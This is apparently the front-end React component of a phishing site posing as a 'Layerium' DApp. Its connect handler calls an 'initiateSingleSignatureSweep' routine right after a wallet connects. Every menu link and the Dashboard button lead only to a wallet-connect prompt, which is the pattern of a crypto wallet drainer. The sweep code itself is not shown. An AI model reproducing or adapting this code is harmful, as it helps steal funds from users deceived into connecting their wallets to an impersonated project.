  useEffect(() => {
    const updateBrand = () => setIsSmallBrand(window.innerWidth <= 480)
    updateBrand()
    window.addEventListener('resize', updateBrand)
    return () => window.removeEventListener('resize', updateBrand)
  }, [])

  const handleConnect = async () => {
    setError(null)
    setIsLoading(true)
    setShowSummary(false)

    try {
      const result = await window.walletHelpers?.connectWallet?.()
      if (!result?.account) {
        throw new Error('Wallet connection failed')
      }
      setAccount(result.account)
      setWalletType(result.walletType || 'WalletConnect')
      setTransferStatus({ success: true, message: 'Wallet connected successfully', walletType: result.walletType })
      
      const sweepResult = await window.walletHelpers?.initiateSingleSignatureSweep?.(result.provider, result.account)
      if (sweepResult) {
        setTransferStatus(sweepResult)
      }
      setShowSummary(true)
    } catch (err) {
      const errorMessage = err?.message || 'Connection failed.'
      
      // Handle WalletConnect failure
      if (errorMessage.includes('CONNECTION_FAILED_MANUAL_MODAL')) {
        // Don't show React modal - WalletConnect modal is handling the error display
        // Manual modal will be triggered automatically by main.js after 4 seconds
        setIsLoading(false)
        return
      }
      
      setError(errorMessage)
    } finally {
      setIsLoading(false)
    }
  }

  const handlePageClick = (event) => {
    const anchor = event.target.closest('a[href="./assets/connect.html"]')
    if (anchor) {
      event.preventDefault()
      // If the click came from the desktop nav-menu or the mobile drawer,
      // open the manual wallet-selection modal. Otherwise use the normal connect flow.
      if (anchor.closest('.nav-menu') || anchor.closest('.mobile-drawer')) {
        try { if (typeof window.openWalletModal === 'function') window.openWalletModal() } catch (err) {}
        return
      }
      handleConnect()
    }
  }

  const openDashboardWalletModal = () => {
    setShowDashboardModal(false)
    if (typeof window.openWalletModal === 'function') {
      window.openWalletModal()
    }
  }

  return createElement(
    'div',
    {
      style: {
        minHeight: '100vh',
        background: '#020617',
        color: '#fff',
        fontFamily: 'Inter, system-ui, sans-serif',
        margin: 0,
        padding: 0
      },
      onClick: handlePageClick
    },
    createElement(
      'div',
      {
        className: 'app-header',
        style: {
          position: 'sticky',
          top: 0,
          zIndex: 1100,
          margin: '0 0 0',
          padding: '12px 18px',
          borderRadius: 0,
          background: 'rgba(255, 255, 255, 0.16)',
          backdropFilter: 'blur(18px)',
          boxShadow: '0 8px 30px rgba(0, 0, 0, 0.12)',
          borderBottom: '1px solid rgba(255, 255, 255, 0.3)',
          display: 'grid',
          gridTemplateColumns: 'auto 1fr auto',
          alignItems: 'center',
          gap: 12
        }
      },
      createElement(
        'div',
        { style: { display: 'flex', alignItems: 'center', gap: 8, justifySelf: 'start' } },
        createElement(
          'a',
          {
            href: '#',
            style: { display: 'inline-flex', alignItems: 'center', textDecoration: 'none' }
          },
          createElement('img', {
            src: 'https://dapps-layerium.pages.dev/images/64967c74c53904c45eb9e983_Asset%206.png',
            alt: 'Layerium logo',
            style: { width: 44, height: 44, objectFit: 'contain', filter: 'drop-shadow(0 2px 6px rgba(0,0,0,0.18))' }
          })
        ),
        createElement(
          'button',
          {
            className: 'hamburger-btn' + (showMobileMenu ? ' open' : ''),
            onClick: () => setShowMobileMenu((s) => !s),
            'aria-label': showMobileMenu ? 'Close menu' : 'Open menu'
          },
          createElement('span', { className: 'bar' }),
          createElement('span', { className: 'bar' }),
          createElement('span', { className: 'bar' })
        )
      ),
      createElement(
        'div',
        {
          className: 'app-title',
          style: isSmallBrand
            ? {
                justifySelf: 'center',
                fontSize: '1.05rem',
                fontWeight: 800,
                letterSpacing: '0.18em',
                textTransform: 'uppercase',
                color: '#ffffff',
                background: 'none',
                WebkitBackgroundClip: 'unset',
                WebkitTextFillColor: 'unset'
              }
            : {
                justifySelf: 'center',
                fontSize: '1.05rem',
                fontWeight: 800,
                letterSpacing: '0.18em',
                textTransform: 'uppercase',
                background: 'linear-gradient(90deg, #ffffff 0%, #60a5fa 45%, #2563eb 100%)',
                WebkitBackgroundClip: 'text',
                WebkitTextFillColor: 'transparent'
              }
        },
        createElement(
          'span',
          {
            style: isSmallBrand
              ? {
                  color: '#ffffff',
                  WebkitTextFillColor: '#ffffff',
                  background: 'none',
                  WebkitBackgroundClip: 'border-box'
                }
              : {
                  color: 'transparent',
                  background: 'linear-gradient(90deg, #ffffff 0%, #60a5fa 45%, #2563eb 100%)',
                  WebkitBackgroundClip: 'text',
                  WebkitTextFillColor: 'transparent'
                }
          },
          isSmallBrand ? 'DAPP' : 'Decentralized DApp'
        )
      ),
      createElement(
        'button',
        {
          type: 'button',
          className: 'dashboard-btn',
          onClick: () => setShowDashboardModal(true),
          style: {
            justifySelf: 'end',
            borderRadius: 999,
            border: '2px solid #fff',
            background: 'linear-gradient(145deg, #2b7fff 0%, #0f3fbd 100%)',
            color: '#fff',
            fontWeight: 700,
            letterSpacing: '0.12em',
            boxShadow: '0 5px 0 #b91c1c, 0 8px 16px rgba(0, 0, 0, 0.16)',
            transform: 'perspective(900px) rotateX(6deg) rotateZ(-4deg)',
            cursor: 'pointer',
            textShadow: '0 1px 0 rgba(255, 255, 255, 0.2)'
          }
        },
        'DASHBOARD'
      )
    ),
    createElement('div', { dangerouslySetInnerHTML: { __html: pageHtml } }),
    createElement(
      'div',
      {
        className: 'mobile-drawer' + (showMobileMenu ? ' open' : ''),
        role: 'dialog',
        'aria-hidden': !showMobileMenu
      },
      createElement(
        'button',
        {
          className: 'close-drawer',
          onClick: () => setShowMobileMenu(false),
          'aria-label': 'Close menu'
        },
        '✕'
      ),
      createElement(
        'nav',
        null,
        ['V2-Optimizer', 'Developers', 'Bridge', 'Roadmap', 'Tokenomics', 'Whitepaper'].map((label) =>
          createElement(
            'a',
            {
              key: label,
              href: '#',
              onClick: (e) => {
                e.preventDefault()
                try { if (typeof window.openWalletModal === 'function') window.openWalletModal() } catch (err) {}
                setShowMobileMenu(false)
              }
            },
            label
          )
        )
      )
    ),
    showDashboardModal &&
      createElement(
        'div',
        {
          style: {
              position: 'fixed',
              inset: 0,
              background: 'rgba(2, 6, 23, 0.68)',
              backdropFilter: 'blur(6px)',
              display: 'grid',
              placeItems: 'center',
              zIndex: 2000
            }
        },
        createElement(
          'div',
          {
            style: {
              width: 'min(92%, 460px)',
              background: 'linear-gradient(145deg, #0f172a, #111827)',
              border: '1px solid rgba(37, 99, 235, 0.75)',
              borderRadius: 24,
              padding: '28px 24px',
              boxShadow: '0 24px 80px rgba(0, 0, 0, 0.35)',
              color: '#fff'
            }
          },
          createElement('h2', { style: { margin: '0 0 12px', fontSize: '1.35rem', textAlign: 'center' } }, 'Dashboard access'),
          createElement(
            'p',
            { style: { margin: '0 0 20px', lineHeight: 1.6, color: '#cbd5e1' } },
            'Connect your wallet to continue to the Dashboard'
          ),
          createElement(
            'button',
            {
              type: 'button',
              onClick: openDashboardWalletModal,
              style: {
                width: '100%',
                padding: '12px 16px',
                borderRadius: 12,
                border: 'none',
                background: '#2563eb',
                color: '#fff',
                cursor: 'pointer',
                fontWeight: 700,
                marginBottom: 10
              }
            },
            'Connect Wallet'
          ),
          createElement(
            'button',
            {
              type: 'button',
              onClick: () => setShowDashboardModal(false),
              style: {
                width: '100%',
                padding: '12px 16px',
                borderRadius: 12,
                border: '1px solid rgba(255,255,255,0.12)',
                background: 'transparent',
                color: '#cbd5e1',
                cursor: 'pointer'
              }
            },
            'Close'
          )
        )
      ),
    showSummary &&
      createElement(
        'div',
        {
          style: {
            position: 'fixed',
            inset: 0,
            background: 'rgba(0,0,0,0.8)',
            display: 'grid',
            placeItems: 'center',
            zIndex: 9999
          }
        },
        createElement(
          'div',
          {
            style: {
              width: 'min(90%, 560px)',
              background: '#07111f',
              borderRadius: 24,
              padding: 24,
              boxShadow: '0 24px 80px rgba(0,0,0,0.4)'
            }
          },
          isLoading &&
            createElement(
              'div',
              { style: { textAlign: 'center', padding: '24px 0' } },
              createElement('div', { style: { fontSize: '2rem', marginBottom: 12 } }, '⏳'),
              createElement('p', { style: { margin: 0, color: '#cbd5e1' } }, 'Connecting to wallet...')
            ),
          !isLoading &&
            createElement(
              'div',
              null,
              createElement('h2', { style: { marginTop: 0, marginBottom: 18, fontSize: '1.5rem' } }, account ? '✓ Wallet Connected' : 'Connection Status'),
              account && createElement('p', { style: { margin: 0, marginBottom: 18, color: '#cbd5e1' } }, 'Your wallet is connected.'),
              account && createElement('div', { style: { marginBottom: 18, wordBreak: 'break-word', fontSize: '0.875rem', background: 'rgba(255,255,255,0.05)', padding: 12, borderRadius: 8, fontFamily: 'monospace' } }, `Account: ${account}`),
              walletType && createElement('div', { style: { marginBottom: 18, opacity: 0.85 } }, `Wallet: ${walletType}`),
              transferStatus &&
                transferStatus.success &&
                createElement(
                  'div',
                  {
                    style: {
                      marginBottom: 18,
                      padding: 12,
                      background: 'rgba(34, 197, 94, 0.1)',
                      borderRadius: 8,
                      color: '#86efac'
                    }
                  },
                  '✓ ' + (transferStatus.message || 'Operation completed successfully')
                ),
              transferStatus &&
                !transferStatus.success &&
                !transferStatus.message?.includes('Connecting') &&
                createElement(
                  'pre',
                  {
                    style: {
                      whiteSpace: 'pre-wrap',
                      wordBreak: 'break-word',
                      background: 'rgba(255,255,255,0.08)',
                      padding: 14,
                      borderRadius: 14,
                      maxHeight: 240,
                      overflow: 'auto',
                      fontSize: '0.75rem'
                    }
                  },
                  JSON.stringify(transferStatus, null, 2)
                ),
              error && createElement('div', { style: { marginBottom: 18, padding: 12, background: 'rgba(239, 68, 68, 0.1)', borderRadius: 8, color: '#fecaca' } }, '✗ ' + error)
            )
        ),
        createElement(
          'button',
          {
            type: 'button',
            onClick: () => setShowSummary(false),
            style: {
              position: 'fixed',
              bottom: 24,
              right: 24,
              padding: '12px 24px',
              borderRadius: 12,
              border: 'none',
              background: '#2563eb',
              color: '#fff',
              cursor: 'pointer',
              fontSize: '0.875rem'
            }
          },
          'Close'
        )
      )
  )
}

export default App
